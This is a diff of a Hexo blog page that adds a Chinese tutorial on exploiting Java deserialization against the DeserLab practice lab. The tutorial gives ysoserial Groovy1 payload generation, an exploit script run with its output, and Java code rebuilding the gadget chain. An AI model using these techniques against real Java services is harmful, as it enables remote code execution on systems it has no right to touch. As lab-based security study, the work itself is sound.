@@ -86,12 +86,166 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。<br>所谓一半技术，一半生活。</p>
+        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cj5p9bvx90002d01b7z0a25fz" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cja0q26e30000u41bbjn52nxe" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Apache-server安全：10个安全提示" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/10/10/Apache-server安全：10个安全提示/" class="article-date">
+  <time datetime="2017-10-10T08:07:18.000Z" itemprop="datePublished">2017-10-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/10/Apache-server安全：10个安全提示/">Apache server安全：10个安全提示</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Apache是​​最流行的Web服务器之一。截至2014年9月，排名前100w的网站有55.7%托管于Apache。它也经常被描述为最安全的Web服务器之一。在本文中，我将介绍一些配置更改，以加强Apache的配置。</p>
+<p>####确保 Apache server-info被禁用<br>如果httpd.conf配置文件中的<location server-info="">指令已启用，则会在从<a href="http://www.example.com/server-info访问/" target="_blank" rel="external">http://www.example.com/server-info访问/</a> server-info页面时显示有关Apache配置的信息。</location></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/10/10/Apache-server安全：10个安全提示/" data-id="cja0q26ev0003u41bypjpju55" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Java反序列化漏洞利用的学习与实践" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/" class="article-date">
+  <time datetime="2017-09-12T11:26:33.000Z" itemprop="datePublished">2017-09-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>当你在尝试学习东西的时候，一个很好的的定期提示是，阅读与实际练习中你阅读的主题不一样的主题。这就是我们为什么去实践读过的项目是有益的。我们将要深入到现在已经存在的众所周知的java反序列化bugs中。最好的实践是你可以去真正的了解手头的项目，并可以根据自己的需要尝试改进。这篇博客我们将要涉及以下内容：</p>
+<ol>
+<li>利用反序列化漏洞</li>
+<li>手动构造我们的payload<br>要清楚的是，第一步将是使用当前的工具实践序列化漏洞的利用，并解释所采用的方法。第二步放大payload；payload究竟是什么？我们如何手工创建？最终的目的是充分了解它是如何工作的，以及掌握将来理解类似bug的方法。<br>我会提到整个博客中使用的所有工具，但是至少你需要了解如下内容：<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/NickstaDB/DeserLab</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这就是我们将要利用的bug，选择一个模拟bug的原因是我们可以控制它的所有面，从而更好的理解一个反序列化漏洞的工作原理。</p>
+<p>###利用Deserlab<br>首先，确保你阅读了介绍DeserLab和Java反序列化的<a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">blog</a><br>这篇blog对Java反序列化协议本身的深入分析。通过继续阅读本节，你将掌握DeserLab的用法。本节其余的部分，我们将使用编译的jar文件，请确认从github下载了这些文件。现在开始吧：<br>通常我处理大多数问题的方法是先了解如何以正确的方式运行，我们需要对DeserLab做如下操作：<br>    运行服务器和客户端<br>    捕获流量<br>    分析流量<br>使用如下命令运行客户端和服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">java -jar DeserLab.jar -server 127.0.0.1 6666</div><div class="line">java -jar DeserLab.jar -client 127.0.0.1 6666</div></pre></td></tr></table></figure></p>
+<p>命令的input/output如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">java -jar DeserLab.jar -server 127.0.0.1 6666</div><div class="line"> [+] DeserServer started, listening on 127.0.0.1:6666</div><div class="line"> [+] Connection accepted from 127.0.0.1:50410</div><div class="line"> [+] Sending hello...</div><div class="line"> [+] Hello sent, waiting <span class="keyword">for</span> hello from client...</div><div class="line"> [+] Hello received from client...</div><div class="line"> [+] Sending protocol version...</div><div class="line"> [+] Version sent, waiting <span class="keyword">for</span> version from client...</div><div class="line"> [+] Client version is compatible, reading client name...</div><div class="line"> [+] Client name received: testing</div><div class="line"> [+] Hash request received, hashing: <span class="built_in">test</span></div><div class="line"> [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6</div><div class="line"> [+] Done, terminating connection.</div><div class="line"></div><div class="line">java -jar DeserLab.jar -client 127.0.0.1 6666</div><div class="line"> [+] DeserClient started, connecting to 127.0.0.1:6666</div><div class="line"> [+] Connected, reading server hello packet...</div><div class="line"> [+] Hello received, sending hello to server...</div><div class="line"> [+] Hello sent, reading server protocol version...</div><div class="line"> [+] Sending supported protocol version to the server...</div><div class="line"> [+] Enter a client name to send to the server:</div><div class="line"> testing</div><div class="line"> [+] Enter a string to <span class="built_in">hash</span>:</div><div class="line"> <span class="built_in">test</span></div><div class="line"> [+] Generating <span class="built_in">hash</span> of <span class="string">"test"</span>...</div><div class="line"> [+] Hash generated: 098f6bcd4621d373cade4e832627b4f6</div></pre></td></tr></table></figure></p>
+<p> 以上不是我们真正关心的问题，真正的问题是，怎么实现反序列化部分。要解答这个问题，你可以用wireshark, tcpdump ,tshark捕获6666端口的流量.要使用tcpdump捕获流量，可以执行如下命令：<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i lo -n -w deserlab.pcap <span class="string">'port 6666'</span></div></pre></td></tr></table></figure></p>
+<p>阅读下面的内容前，用wireshark打开pcap文件。根据Nick的<a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">blog</a>，你至少可以识别来回传递的序列化Java对象:<br><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/normaldeser.png" alt=""></p>
+<p>#####序列化数据的提取：<br>现在我们指出了序列化数据正在传输的事实，让我们开始了解实际传输的内容。我决定使用这两款实用的工具 <a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="external">SerializationDumper</a>和<a href="https://github.com/frohoff/jdeserialize/tree/master/jdeserialize" target="_blank" rel="external">jdeserialize</a>，而不是根据blog中提供的信息编写自己的解析器。在我们使用工具之前，我们需要准备数据，所以把pcap包转换成我们可以分析的数据。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v <span class="string">',,'</span> | grep <span class="string">'^6666,'</span> | cut -d<span class="string">','</span> -f2 | tr <span class="string">'\n'</span> <span class="string">':'</span> | sed s/://g</div></pre></td></tr></table></figure></p>
+<p>现在一行缩短了很多，现在它可以工作了。我们把他分解成可理解的块，它所做的就是把pcap数据转换成一行十六进制编码的输出字符串。它做的第一件事是将pcap转换成只包含传输数据和Tcp源端口，目的端口的文本形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r deserlab.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=,</div></pre></td></tr></table></figure></p>
+<p>看起来像这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">50432,,6666</div><div class="line">6666,,50432</div><div class="line">50432,,6666</div><div class="line">50432,aced0005,6666</div><div class="line">6666,,50432</div><div class="line">6666,aced0005,50432</div></pre></td></tr></table></figure></p>
+<p>在像上面的代码片段中可以看到，在TCP三次握手之间没有数据，因此有,,这部分。之后客户端发送服务端确认的第一个字节，然后服务端返回一些字节等等。命令的第二部分将它转换为字符串，只需根据行开始处的端口选择有效payloads。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">| grep -v <span class="string">',,'</span> | grep <span class="string">'^6666,'</span> | cut -d<span class="string">','</span> -f2 | tr <span class="string">'\n'</span> <span class="string">':'</span> | sed s/://g</div><div class="line">以上的命令仅会选择服务器的回复，如果希望客户端数据需要更改端口好。最终转换结果显示如下所示：</div><div class="line">```bash</div><div class="line">aced00057704f000baaa77020101737200146e622e64657365722e486[...]</div></pre></td></tr></table></figure></p>
+<p>这是我们可以使用的，因为它是发送和接受的数据的干净的表示。让我们使用这两个工具分析一下数据，首先我们使用SerializationDumper，然后我们将使用jdeserialize。为什么是用两个工具？因为（如果可能的话）用不同的工具来分析潜在的错误或问题是很好的做法。如果你坚持使用一个工具，可能会出错，而没有察觉。尝试不同的 工具也非常有趣。</p>
+<p>#####序列化数据分析<br>使用SerializationDumper是非常简单的，因为你可以传递序列化数据的十六进制形式作为第一个参数，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar SerializationDumper-v1.0.jar aced00057704f000baaa77020101</div></pre></td></tr></table></figure></p>
+<p>输出的内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">STREAM_MAGIC - 0xac ed</div><div class="line">STREAM_VERSION - 0x00 05</div><div class="line">Contents</div><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 4 - 0x04</div><div class="line"> Contents - 0xf000baaa</div><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 2 - 0x02</div><div class="line"> Contents - 0x0101</div><div class="line"> TC_OBJECT - 0x73</div><div class="line"> TC_CLASSDESC - 0x72</div><div class="line"> className</div><div class="line"> Length - 20 - 0x00 14</div><div class="line"> Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374</div></pre></td></tr></table></figure></p>
+<p>如果我们要使用jdeserialize分析相同的序列化数据，首先要构建jdeserialize，可以使用提供的build.xml文件里的<a href="http://ant.apache.org/" target="_blank" rel="external">ant</a>。我选择了手动编译，可以通过以下命令实现：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir build</div><div class="line">javac -d ./build/ src/*</div><div class="line"><span class="built_in">cd</span> build</div><div class="line">jar cvf jdeserialize.jar *</div></pre></td></tr></table></figure></p>
+<p>经过以上操作我们可以产生一个可以使用的jar文件，你可以用下面的命令测试它，它会显示帮助信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp jdeserialize.jar org.unsynchronized.jdeserialize</div></pre></td></tr></table></figure></p>
+<p>由于jdeserialize需要一个文件，我们可以用如下的Python代码转换序列化数据的十六进制表示形式（注意缩短十六进制字符串以进行博客布局）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'rawser.bin'</span>,<span class="string">'wb'</span>).write(<span class="string">'aced00057704f000baaa77020146636'</span>.decode(<span class="string">'hex'</span>))</div></pre></td></tr></table></figure></p>
+<p>我们现在可以通过运行jdeserialize来分析这个文件，文件名作为应该产生的第一个参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">java -cp jdeserialize.jar org.unsynchronized.jdeserialize rawser.bin</div><div class="line"> <span class="built_in">read</span>: [blockdata 0x00: 4 bytes]</div><div class="line"> <span class="built_in">read</span>: [blockdata 0x00: 2 bytes]</div><div class="line"> <span class="built_in">read</span>: nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line"> //// BEGIN stream content output</div><div class="line"> [blockdata 0x00: 4 bytes]</div><div class="line"> [blockdata 0x00: 2 bytes]</div><div class="line"> nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line"> //// END stream content output</div><div class="line"></div><div class="line">//// BEGIN class declarations (excluding array classes)</div><div class="line"> class nb.deser.HashRequest implements java.io.Serializable &#123;</div><div class="line"> java.lang.String dataToHash;</div><div class="line"> java.lang.String theHash;</div><div class="line"> &#125;</div><div class="line"></div><div class="line">//// END class declarations</div><div class="line"></div><div class="line">//// BEGIN instance dump</div><div class="line"> [instance 0x7e0002: 0x7e0000/nb.deser.HashRequest</div><div class="line"> field data:</div><div class="line"> 0x7e0000/nb.deser.HashRequest:</div><div class="line"> dataToHash: r0x7e0003: [String 0x7e0003: <span class="string">"test"</span>]</div><div class="line"> theHash: r0x7e0004: [String 0x7e0004: <span class="string">"098f6bcd4621d373cade4e832627b4f6"</span>]</div><div class="line"> ]</div><div class="line"> //// END instance dump</div></pre></td></tr></table></figure></p>
+<p>我们从序列化数据分析工具的输出中学到的第一件事是它的序列化数据:)。我们学到的第二件事就是，事实上在客户端和服务器之间显式地传送一个对象“nb.deser.HashRequest”。如果我们将此分析与我们之前的wireshark查看的数据结合在一起，我们可以知道用户名是以TC_BLOCKDATA类型的字符串形式发送的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> TC_BLOCKDATA - 0x77</div><div class="line"> Length - 9 - 0x09</div><div class="line"> Contents - 0x000774657374696e67</div><div class="line"></div><div class="line"><span class="string">'000774657374696e67'</span>.decode(<span class="string">'hex'</span>)</div><div class="line"><span class="string">'\x00\x07testing'</span></div></pre></td></tr></table></figure></p>
+<p>这让我们非常了解DeserLab客户端和DeserLab服务器如何相互通信。现在我们来看看如何使用ysoserial来利用。</p>
+<h5 id="Deserlab的利用"><a href="#Deserlab的利用" class="headerlink" title="Deserlab的利用"></a>Deserlab的利用</h5><p>由于我们通过对pcap和序列化数据的分析，我们对这个通信有一个清晰的了解，我们可以用嵌入ysoserial paylaod的一些硬编码数据构建我们自己的python脚本。为了保持简单，并且和wireshark流匹配，我决定几乎完全像wireshark流一样实现它，看起来就像：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mydeser = deser(myargs.targetip, myargs.targetport)</div><div class="line">mydeser.connect()</div><div class="line">mydeser.javaserial()</div><div class="line">mydeser.protohello()</div><div class="line">mydeser.protoversion()</div><div class="line">mydeser.clientname()</div><div class="line">mydeser.exploit(myargs.payloadfile)</div></pre></td></tr></table></figure></p>
+<p>你可以在<a href="https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7" target="_blank" rel="external">这里</a>找到完整的脚本。就像你可以看到的简单的模式方法是硬编码所有java反序列化数据。你可能想知道为什么mydeser.exploit(myargs.payloadfile)函数出现在mydeser.clientname()之后。也许更重要的是我如何决定的它的位置。我们来看看我的思考过程，以及如何实际生成和发送ysoserial payload。<br>在阅读的几篇关于java反序列化的文章（blog结尾处的引用）中，我了解到：大多数漏洞与java反序列化对象有关。<br>所以据我所知，当我们审查信息交换的时候就有java对象交换。这很容易在序列化分析的过程中发现，因为它包含‘ TC_OBJECT – 0x73’或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//// BEGIN stream content output</div><div class="line">[blockdata 0x00: 4 bytes]</div><div class="line">[blockdata 0x00: 2 bytes]</div><div class="line">[blockdata 0x00: 9 bytes]</div><div class="line">nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;</div><div class="line">//// END stream content output</div></pre></td></tr></table></figure></p>
+<p>我们可以清楚的看到流的最后一部分是 ‘nb.deser.HashRequest’ 对象。读取这个对象的地方也是交换的最后一部分，因此解释了为什么代码最后一部分可以exploit。<br>DeserLab本身的代码并没有真正包含任何有用的东西，我们可以通过修改序列化漏洞利用它。<br>这个问题在下一节“手动创建payload”会很明显，现在我们就接受就好了。所以这意味着我们必须寻找可能包含可以帮助我们的代码的其他库。DeserLab中只有一个Groovy库，这就提示我们要用ysoserial payload；在实际使用中，可能需要自己反编译未知的库，自己开发有用的小工具。<br>由于知道了利用使用的库，payload的生成就非常简单：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 <span class="string">'ping 127.0.0.1'</span> &gt; payload.bin</div></pre></td></tr></table></figure></p>
+<p>要知道payload如何工作，需要一些方法来检测它。现在ping 到 localhost就足够了，但是在现实世界中你需要更有创意。<br>现在一切准备就绪，你会认为它只是一个关闭有效载荷的问题？你是对的，但是我们不要忘了，java序列化头交换已经发生。<br>这意味着我们要把paylaod的前四个字节单独发出去：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">./deserlab_exploit.py 127.0.0.1 6666 payload_ping_localhost.bin</div><div class="line">2017-09-07 22:58:05,401 - INFO - Connecting</div><div class="line">2017-09-07 22:58:05,401 - INFO - java serialization handshake</div><div class="line">2017-09-07 22:58:05,403 - INFO - protocol specific handshake</div><div class="line">2017-09-07 22:58:05,492 - INFO - protocol specific version handshake</div><div class="line">2017-09-07 22:58:05,571 - INFO - sending name of connected client</div><div class="line">2017-09-07 22:58:05,571 - INFO - exploiting</div></pre></td></tr></table></figure></p>
+<p>如果一切顺利，你将看到以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo tcpdump -i lo icmp</div><div class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</div><div class="line">listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes</div><div class="line">22:58:06.215178 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> request, id 31636, seq 1, length 64</div><div class="line">22:58:06.215187 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> reply, id 31636, seq 1, length 64</div><div class="line">22:58:07.215374 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> request, id 31636, seq 2, length 64</div></pre></td></tr></table></figure></p>
+<p>我们已经成功地利用了DeserLab。接下来两个部分，我们希望能更好地了解我们发送到DeserLab的payload。</p>
+<p>###手动创建payload<br>了解我们的payload的最好的方法是自己重建完全相同的payload，是的，这意味着写java代码。但问题是我们从哪里开始？我们可以像我们在看pcap时一样看看序列化payload。下面的代码将payload转换为十六进制字符串，我们可以使用SerializationDumper或者jdeserialize分析文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'payload.bin'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>().encode(<span class="string">'hex</span></div></pre></td></tr></table></figure></p>
+<p>所以让我们来详细了解一下，在具体情况下，如何运作。当然，在找出这一切后，你发现了一个已经描述它的页面，所以你可以跳过这个部分，阅读<a href="https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical" target="_blank" rel="external">这个</a>。本节的其余部分将着重于我的方法。我的方法的重要支柱之一也在阅读这个漏洞的ysoserial实现的根源。我不会不断提到，但如果你想知道我是如何计算出流量的，那是由于读取ysoserial实现的。<br>通过这些工具放置有效载荷后，在这两种情况下，都会产生很多Java类的很长的输出。要注意的主要类名是输出“sun.reflect.annotation.AnnotationInvocationHandler”的第一个。这个类可能看起来很熟悉，因为它似乎是大量反序列化漏洞的入门点。引起我注意的其他事情是“java.lang.reflect.Proxy”，“org.codehaus.groovy.runtime.ConvertedClosure”和“org.codehaus.groovy.runtime.MethodClosure”。他们引起了我注意的原因是因为他们引用了我们用于开发的库，以及从线上文章中已知的类来解释Java反序列化漏洞并与我在ysoserial源中看到的类匹配。<br>有一个重要的概念，你需要注意，事实上，当你执行反序列化攻击时，你发送一个对象的“保存”状态说话。这意味着你完全依赖于接收方的行为，更具体地说，你依赖于“保存”状态反序列化时所采取的操作。这意味着如果对方不调用发送对象的任何方法，则不会执行远程代码。这意味着你唯一的影响是设置你发送的对象的属性。现在这个概念很清楚，这意味着我们发送的第一个类应该有一个自动调用的方法，如果我们要实现代码执行，这解释了为什么第一类是如此特别。如果我们看看AnnotationInvocationHandler的代码，我们可以看到构造函数接受一个java.util.map对象，并且方法readObject调用Map对象上的一个方法。像你可能从阅读其他文章可以知道，当流被反序列化时，readObject被自动调用。我们开始构建我们自己的漏洞利用，基于这些信息，并从多个其他文章（在本文末尾引用的代码中）借鉴代码，我们创建以下内容。如果你想了解代码读取反思。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//this is the first class that will be deserialized</div><div class="line">String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line">//access the constructor of the AnnotationInvocationHandler class</div><div class="line">final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];</div><div class="line">//normally the constructor is not accessible, so we need to make it accessible</div><div class="line">constructor.setAccessible(<span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
+<p>这通常是我有时花了几个小时调试和阅读我不知道的所有事情的部分，因为如果你尝试编译这个很好，你会学到很多.所以这里是你可以编译的代码段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//regular imports</div><div class="line">import java.io.IOException;</div><div class="line"></div><div class="line">//reflection imports</div><div class="line">import java.lang.reflect.Constructor;</div><div class="line"></div><div class="line">public class ManualPayloadGenerateBlog&#123;</div><div class="line"> public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</div><div class="line"> //this is the first class that will be deserialized</div><div class="line"> String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line"> //access the constructor of the AnnotationInvocationHandler class</div><div class="line"> final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];</div><div class="line"> //normally the constructor is not accessible, so we need to make it accessible</div><div class="line"> constructor.setAccessible(<span class="literal">true</span>);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>你可以使用以下命令来编译和运行代码，即使它不会执行任何操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac ManualPayloadGenerateBlog</div><div class="line">java ManualPayloadGenerateBlog</div></pre></td></tr></table></figure></p>
+<p>当你扩展此代码时，请记住以下内容：<br>google打印的错误代码<br>类名应等于文件名<br>知道有java 帮助<br>上述代码使初始入口点类可用，构造函数可访问，但是我们需要为构造函数提供哪些参数？大多数例子有以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">constructor.newInstance(Override.class, map);</div></pre></td></tr></table></figure></p>
+<p>我理解的’map’参数，就是在初始readObject调用期间调用’entrySet’方法的对象。我不明白第一个参数的内部工作原理，主要的一点是在readObject方法内部进行检查，以确保第一个参数的类型为“AnnotationType”。我们通过提供“AnnotationType”类型的buildin’Override’类来实现这一点。<br>现在我们来到有趣的部分，从’好的有道理’到’这是如何工作的’。要理解，重要的是要意识到第二个参数是一个Java代理对象，而不是一个简单的Java映射对象。这是什么意思？<a href="http://www.baeldung.com/java-dynamic-proxies" target="_blank" rel="external">这篇文章</a>很好的解释了Java动态代理，并提供了很好的代码示例，这是文章的引用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dynamic proxies allow one single class with one single method to service multiple method calls to arbitrary classes with an arbitrary number of methods. A dynamic proxy can be thought of as a kind of Facade, but one that can pretend to be an implementation of any interface. Under the cover, it routes all method invocations to a single handler – the invoke() method.</div></pre></td></tr></table></figure></p>
+<p>我理解的是，它是一个 Java map 对象，然后将所有调用原始的Map对象方法路由到另一个类的单一方法。让我们看看我们现在所了解的：<br><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/flow.png" alt=""><br>这意味着我们可以尝试用这样一个Map对象来扩展我们的源代码，例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] &#123;Map.class&#125;, &lt;unknown-invocationhandler&gt;);</div></pre></td></tr></table></figure></p>
+<p>注意我们仍然需要适应的 invocationhandler，但我们没有。这是Groovy最终要适应的部分，因为直到现在我们仍然在常规Java类的领域。Groovy适合的原因是因为它有一个InvocationHandler。所以当InvocationHandler被调用时，最终会导致代码执行如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(<span class="string">"ping 127.0.0.1"</span>, <span class="string">"execute"</span>), <span class="string">"entrySet"</span>);</div><div class="line">final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] &#123;Map.class&#125;, closure);</div></pre></td></tr></table></figure></p>
